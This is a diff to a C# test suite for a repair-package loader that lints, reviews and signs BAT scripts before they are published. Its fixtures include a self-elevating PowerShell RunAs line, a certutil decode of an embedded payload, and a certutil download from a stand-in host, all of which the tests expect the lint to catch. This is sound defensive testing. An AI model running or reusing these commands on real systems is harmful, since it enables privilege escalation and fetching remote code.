@@ -151,6 +151,87 @@ public sealed class RepairPackageLoaderTests : IDisposable
         Assert.Contains(status.Reasons, reason => reason.Contains("sign it again"));
     }
 
+    private const string SelfElevatingBat =
+        "@echo off\r\nnet session >nul 2>&1 || (powershell -Command \"Start-Process '%~f0' -Verb RunAs\" & exit /b)\r\nexit /b 0\r\n";
+
+    private static void AcceptRisks(JsonObject package, params string[] risks) =>
+        package["review"] = new JsonObject
+        {
+            ["reviewedBy"] = "Tester",
+            ["acceptedRisks"] = new JsonArray(risks.Select(risk => (JsonNode)risk).ToArray())
+        };
+
+    [Fact]
+    public async Task SelfElevatingBatIsBlockedUntilTheReviewerAcceptsTheRisk()
+    {
+        await WritePackageAsync("elevates", bat: SelfElevatingBat);
+        await WritePackageAsync("elevates-accepted", bat: SelfElevatingBat,
+            edit: package => AcceptRisks(package, BatRisks.SelfElevation));
+
+        var statuses = await CreateRepository().GetPackageStatusesAsync(
+            TestContext.Current.CancellationToken);
+        var published = await CreateRepository().GetRepairPackagesAsync(
+            TestContext.Current.CancellationToken);
+
+        Assert.Equal(BatPackageStatuses.LintRejected,
+            statuses.Single(item => item.Id == "elevates").Status);
+        var accepted = statuses.Single(item => item.Id == "elevates-accepted");
+        Assert.Equal(BatPackageStatuses.ReadyWithWarnings, accepted.Status);
+        Assert.Contains(accepted.Warnings, warning => warning.StartsWith("Accepted risk (self-elevation)"));
+        var package = Assert.Single(published);
+        Assert.Equal("elevates-accepted", package.Descriptor.PackageId);
+        Assert.Equal([BatRisks.SelfElevation], package.Descriptor.AcceptedRisks);
+        Assert.True(PackageSignaturePolicy.Verify(package.Descriptor, [TestPackageSigner.PublicKey]));
+    }
+
+    [Fact]
+    public async Task EncodedPayloadCanBeAcceptedButADownloadCannot()
+    {
+        await WritePackageAsync("payload", edit: package => AcceptRisks(package,
+                BatRisks.EmbeddedPayload),
+            bat: "@echo off\r\ncertutil -decode data.b64 run.ps1\r\nexit /b 0\r\n");
+        await WritePackageAsync("download", edit: package => AcceptRisks(package,
+                BatRisks.SelfElevation, BatRisks.EmbeddedPayload),
+            bat: "@echo off\r\ncertutil -urlcache -f http://example.test/x x\r\nexit /b 0\r\n");
+
+        var statuses = await CreateRepository().GetPackageStatusesAsync(
+            TestContext.Current.CancellationToken);
+
+        Assert.True(BatPackageStatuses.IsPublished(
+            statuses.Single(item => item.Id == "payload").Status));
+        var download = statuses.Single(item => item.Id == "download");
+        Assert.Equal(BatPackageStatuses.LintRejected, download.Status);
+        Assert.Contains(download.Reasons, reason => reason.Contains("cannot be accepted"));
+    }
+
+    [Fact]
+    public async Task OnlyKnownRisksMayBeAccepted()
+    {
+        await WritePackageAsync("bad-risk", edit: package => AcceptRisks(package, "network-download"));
+
+        var status = await SingleStatusAsync();
+
+        Assert.Equal(BatPackageStatuses.Invalid, status.Status);
+        Assert.Contains(status.Reasons, reason => reason.Contains("review.acceptedRisks may only contain"));
+    }
+
+    [Fact]
+    public async Task AddingAnAcceptedRiskAfterSigningInvalidatesTheSignature()
+    {
+        // Signed with no accepted risks, then a risk is added to package.json by hand.
+        await WritePackageAsync("tampered", bat: SelfElevatingBat);
+        var path = Path.Combine(_root, "packages", "tampered", "package.json");
+        var node = JsonNode.Parse(await File.ReadAllTextAsync(path,
+            TestContext.Current.CancellationToken))!.AsObject();
+        AcceptRisks(node, BatRisks.SelfElevation);
+        await File.WriteAllTextAsync(path, node.ToJsonString(),
+            TestContext.Current.CancellationToken);
+
+        var status = await SingleStatusAsync();
+
+        Assert.Equal(BatPackageStatuses.Unsigned, status.Status);
+    }
+
     [Fact]
     public async Task GuiExeCanOnlyRunWithoutInput()
     {
@@ -287,6 +368,124 @@ public sealed class RepairPackageLoaderTests : IDisposable
         Assert.True(BatPackageStatuses.IsPublished((await SingleStatusAsync()).Status));
     }
 
+    public static TheoryData<string> InstallPackages() =>
+    [
+        "chrome-install", "adobe-connect-install", "photos-install", "persian-fonts-install",
+        "foxit-reader-install", "foxit-editor-install"
+    ];
+
+    [Theory]
+    [MemberData(nameof(InstallPackages))]
+    public async Task CheckedInInstallPackageIsReadyWithItsFiles(string id)
+    {
+        var folder = await CopyCheckedInPackageAsync(id);
+
+        var repository = CreateRepository();
+        var status = await SingleStatusAsync();
+        var published = Assert.Single(await repository.GetRepairPackagesAsync(
+            TestContext.Current.CancellationToken));
+        var descriptor = published.Descriptor;
+
+        // Ready, not "Ready with lint warnings": the BAT has nothing the lint flags.
+        Assert.True(status.Status == BatPackageStatuses.Ready,
+            string.Join(" ", status.Reasons));
+        Assert.Empty(BatScriptLint.Inspect(await File.ReadAllTextAsync(
+            Path.Combine(folder, $"{id}.bat"),
+            TestContext.Current.CancellationToken)).Warnings);
+        Assert.StartsWith("install-", published.Problem);
+        Assert.NotEmpty(descriptor.SupportFiles!);
+        // 10 already installed, 3010 installed and the user signs out or restarts.
+        Assert.Contains(10, descriptor.Playbook.SuccessExitCodes!);
+        Assert.Equal([3010], descriptor.Playbook.RestartExitCodes);
+        Assert.Equal(["ERROR:"], descriptor.Playbook.FailureMarkers);
+        Assert.Empty(descriptor.Playbook.Steps);
+        Assert.Empty(descriptor.Playbook.Arguments ?? []);
+    }
+
+    [Fact]
+    public async Task CheckedInChromeResetPackageIsReady()
+    {
+        await CopyCheckedInPackageAsync("chrome-reset");
+
+        var status = await SingleStatusAsync();
+        var published = Assert.Single(await CreateRepository().GetRepairPackagesAsync(
+            TestContext.Current.CancellationToken));
+
+        Assert.True(status.Status == BatPackageStatuses.Ready,
+            string.Join(" ", status.Reasons));
+        Assert.Equal("chrome-reset-settings", published.Problem);
+        // 0 reset, 20 Chrome not installed, 21 no Chrome settings for this user.
+        Assert.Equal([0, 20, 21], published.Descriptor.Playbook.SuccessExitCodes);
+        Assert.Empty(published.Descriptor.SupportFiles ?? []);
+    }
+
+    /// <summary>
+    /// Copies a checked-in package into the test repository, with stand-ins for vendor
+    /// installers (not in git), and signs it with the test key.
+    /// </summary>
+    private async Task<string> CopyCheckedInPackageAsync(string id)
+    {
+        var source = Path.Combine(RepositoryRoot(), "deploy", "control-plane",
+            "FileRepository", "packages", id);
+        var folder = Directory.CreateDirectory(Path.Combine(_root, "packages", id)).FullName;
+        File.Copy(Path.Combine(source, $"{id}.bat"), Path.Combine(folder, $"{id}.bat"));
+        var package = JsonNode.Parse(await File.ReadAllTextAsync(
+            Path.Combine(source, "package.json"),
+            TestContext.Current.CancellationToken))!.AsObject();
+        Directory.CreateDirectory(Path.Combine(folder, "files"));
+        foreach (var entry in package["supportFiles"]!.AsArray())
+        {
+            // Vendor installers are not in git; a stand-in takes their place.
+            var name = entry!["fileName"]!.GetValue<string>();
+            var checkedIn = Path.Combine(source, "files", name);
+            var bytes = File.Exists(checkedIn) && !IsVendorInstaller(name)
+                ? await File.ReadAllBytesAsync(checkedIn, TestContext.Current.CancellationToken)
+                : Encoding.ASCII.GetBytes($"stand-in for {name}");
+            await File.WriteAllBytesAsync(Path.Combine(folder, "files", name), bytes,
+                TestContext.Current.CancellationToken);
+            entry["sha256"] = Convert.ToHexString(SHA256.HashData(bytes));
+        }
+        package.Remove("signature");
+        TestPackageSigner.Sign(package, folder);
+        await File.WriteAllTextAsync(Path.Combine(folder, "package.json"),
+            package.ToJsonString(), TestContext.Current.CancellationToken);
+        return folder;
+    }
+
+    [Fact]
+    public async Task SoftwareInstallSkillListsEveryInstallPackage()
+    {
+        var root = RepositoryRoot();
+        var skill = await File.ReadAllTextAsync(Path.Combine(root, "deploy", "hermes", "skills",
+            "software-install", "SKILL.md"), TestContext.Current.CancellationToken);
+        var packages = Directory.GetDirectories(Path.Combine(root, "deploy", "control-plane",
+                "FileRepository", "packages"))
+            .Select(directory => JsonNode.Parse(File.ReadAllText(
+                Path.Combine(directory, "package.json")))!)
+            .Where(package => package["problem"]?.GetValue<string>()
+                .StartsWith("install-", StringComparison.Ordinal) == true)
+            .ToList();
+
+        Assert.Equal(InstallPackages().Count, packages.Count);
+        foreach (var package in packages)
+        {
+            Assert.Contains($"`{package["problem"]!.GetValue<string>()}`", skill);
+            Assert.Contains($"`{package["id"]!.GetValue<string>()}`", skill);
+        }
+    }
+
+    private static bool IsVendorInstaller(string name) =>
+        Path.GetExtension(name).ToLowerInvariant() is ".msi" or ".exe" or ".msix"
+            or ".msixbundle" or ".appx" or ".appxbundle";
+
+    private static string RepositoryRoot()
+    {
+        var root = AppContext.BaseDirectory;
+        while (!File.Exists(Path.Combine(root, "EndpointAgents.slnx")))
+            root = Path.GetDirectoryName(root)!;
+        return root;
+    }
+
     private static BatchPlaybook Playbook(params BatchPlaybookStep[] steps) =>
         new(3, steps, Arguments: steps.Length == 0 ? ["/quiet"] : [],
             TimeoutSeconds: 120, RestartExitCodes: [3010]);
@@ -305,11 +504,12 @@ public sealed class RepairPackageLoaderTests : IDisposable
 
     private async Task<string> WritePackageAsync(string id, string? exe = null,
         BatchPlaybook? playbook = null, (string Name, string Content)? supportFile = null,
-        string? fileName = null, Action<JsonObject>? edit = null, bool sign = true)
+        string? fileName = null, Action<JsonObject>? edit = null, bool sign = true,
+        string? bat = null)
     {
         var folder = Directory.CreateDirectory(Path.Combine(_root, "packages", id)).FullName;
         fileName ??= exe is null ? "Vendor Tool.bat" : "Vendor Tool.exe";
-        var bytes = exe is null ? Encoding.ASCII.GetBytes(Bat)
+        var bytes = exe is null ? Encoding.ASCII.GetBytes(bat ?? Bat)
             : await File.ReadAllBytesAsync(exe, TestContext.Current.CancellationToken);
         await File.WriteAllBytesAsync(Path.Combine(folder, fileName), bytes,
             TestContext.Current.CancellationToken);
